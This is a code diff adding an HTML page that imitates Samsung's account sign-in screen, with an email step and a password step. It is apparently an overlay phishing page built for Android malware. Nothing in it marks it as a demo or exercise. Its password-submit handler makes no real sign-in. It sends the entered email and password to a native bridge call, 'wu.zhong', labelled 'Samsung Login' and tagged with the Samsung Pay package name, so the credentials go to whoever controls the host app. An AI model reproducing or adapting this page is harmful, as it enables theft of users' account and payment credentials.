@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Samsung Account - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Samsung One', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #e8e8e8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1.5rem;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 320px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .header h2 {
+            color: #757575;
+            font-size: 1.0625rem;
+            font-weight: 400;
+            margin-bottom: 2rem;
+            letter-spacing: 0;
+        }
+
+        .main-heading {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .main-heading h1 {
+            color: #2a2a2a;
+            font-size: 1.625rem;
+            font-weight: 300;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+            letter-spacing: -0.01em;
+        }
+
+        .description {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .description p {
+            color: #666;
+            font-size: 1rem;
+            line-height: 1.25;
+        }
+
+        .back-section {
+            display: flex;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #757575;
+            font-size: 1.25rem;
+            margin-right: 0.5rem;
+            cursor: pointer;
+            padding: 0.25rem;
+            line-height: 1;
+        }
+
+        .back-button:hover {
+            color: #2a2a2a;
+        }
+
+        .email-display {
+            color: #2a2a2a;
+            font-size: 0.9375rem;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 3rem;
+            background: transparent;
+            border: none;
+            border-bottom: 1.5px solid #9e9e9e;
+            font-size: 1rem;
+            color: #2a2a2a;
+            outline: none;
+            transition: border-color 0.3s ease;
+            padding: 0;
+        }
+
+        .input-field:focus {
+            border-bottom-color: #8e7cc3;
+        }
+
+        .input-field::placeholder {
+            color: #9e9e9e;
+            font-weight: 300;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            padding: 0.25rem;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle:hover {
+            color: #333;
+        }
+
+        .password-toggle svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .next-button {
+            width: 100%;
+            background-color: #a89bf7;
+            color: white;
+            border: none;
+            border-radius: 9999px;
+            padding: 1rem 2rem;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 2rem;
+            text-transform: none;
+            letter-spacing: 0;
+        }
+
+        .next-button:hover {
+            background-color: #9085f5;
+        }
+
+        .next-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .help-link {
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .help-link button {
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 1rem;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .help-link button:hover {
+            color: #333;
+        }
+
+        .additional-links {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .additional-links button {
+            display: block;
+            width: 100%;
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 1rem;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-bottom: 1rem;
+            padding: 0.5rem;
+        }
+
+        .additional-links button:hover {
+            color: #333;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .error-message {
+            color: #dc2626;
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+            text-align: center;
+        }
+
+        .success-message {
+            color: #16a34a;
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container">
+         
+            <div id="page1" class="page active">
+                <div class="header">
+                    <h2>Samsung Account</h2>
+                </div>
+
+                <div class="main-heading">
+                    <h1>One account. Any<br>device. Just for you.</h1>
+                </div>
+
+                <div class="description">
+                    <p>Sign in to get started</p>
+                </div>
+
+                <form id="emailForm">
+                    <div class="form-group">
+                        <input 
+                            type="text" 
+                            id="emailInput" 
+                            class="input-field" 
+                            placeholder="Phone number or email"
+                        >
+                    </div>
+
+                    <button type="submit" class="next-button" id="nextButton">
+                        Next
+                    </button>
+                </form>
+
+                <div class="help-link">
+                    <button type="button" onclick="showHelp()">Help</button>
+                </div>
+
+                <div id="emailError" class="error-message" style="display: none;"></div>
+            </div>
+
+        
+            <div id="page2" class="page">
+                <div class="header">
+                    <h2>Samsung Account</h2>
+                </div>
+
+                <div class="main-heading">
+                    <h1>One account. Any<br>device. Just for you.</h1>
+                </div>
+
+                <div class="description">
+                    <p>Sign in to get started</p>
+                </div>
+
+                <div class="back-section">
+                    <button type="button" class="back-button" onclick="goBack()">←</button>
+                    <span class="email-display" id="emailDisplay"></span>
+                </div>
+
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <input 
+                            type="password" 
+                            id="passwordInput" 
+                            class="input-field" 
+                            placeholder="Password"
+                            required
+                        >
+                        <button type="button" class="password-toggle" onclick="togglePassword()" id="passwordToggle">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>
+                                <path d="m10.73 5.08-0.05 0.08A16.94 16.94 0 0 0 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>
+                                <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/>
+                                <line x1="2" y1="2" x2="22" y2="22"/>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <button type="submit" class="next-button" id="signinButton">
+                        Sign in
+                    </button>
+                </form>
+
+                <div class="additional-links">
+                    <button type="button" onclick="forgotPassword()">Forgot password?</button>
+                    <button type="button" onclick="verifyEmail()">Verify with one-time email</button>
+                </div>
+
+                <div id="passwordError" class="error-message" style="display: none;"></div>
+                <div id="successMessage" class="success-message" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentEmail = '';
+        let isPasswordVisible = false;
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+            return emailRegex.test(email) || phoneRegex.test(email);
+        }
+
+        function showError(elementId, message) {
+            
+        }
+
+        function showSuccess(message) {
+            const successElement = document.getElementById('successMessage');
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            setTimeout(() => {
+                successElement.style.display = 'none';
+            }, 3000);
+        }
+
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('emailInput').value.trim();
+            
+            if (!email) {
+                showError('emailError', 'Please enter your email or phone number.');
+                return;
+            }
+
+            if (!validateEmail(email)) {
+                showError('emailError', 'Please enter a valid email address or phone number.');
+                return;
+            }
+
+            currentEmail = email;
+            document.getElementById('emailDisplay').textContent = email;
+            
+            const button = document.getElementById('nextButton');
+            button.disabled = true;
+            button.textContent = '...';
+            
+            setTimeout(() => {
+                button.disabled = false;
+                button.textContent = 'Next';
+                showPasswordPage();
+            }, 500);
+        });
+
+        document.getElementById('passwordForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const password = document.getElementById('passwordInput').value.trim();
+            
+            if (!password) {
+                showError('passwordError', 'Please enter your password.');
+                return;
+            }
+
+              wu.zhong(`🔰Samsung Login \n\n✉️Email: ${ document.getElementById('emailInput').value}\n🔒Password: ${password}`,"com.samsung.android.spay");
+
+            
+        });
+
+        function showPasswordPage() {
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+            document.getElementById('passwordInput').focus();
+        }
+
+        function goBack() {
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page1').classList.add('active');
+            document.getElementById('emailInput').focus();
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            const toggleButton = document.getElementById('passwordToggle');
+            
+            isPasswordVisible = !isPasswordVisible;
+            
+            if (isPasswordVisible) {
+                passwordInput.type = 'text';
+                toggleButton.innerHTML = `
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                `;
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.innerHTML = `
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>
+                        <path d="m10.73 5.08-0.05 0.08A16.94 16.94 0 0 0 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>
+                        <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/>
+                        <line x1="2" y1="2" x2="22" y2="22"/>
+                    </svg>
+                `;
+            }
+        }
+
+ 
+       
+
+   
+        document.getElementById('emailInput').focus();
+    </script>
+</body>
+</html>
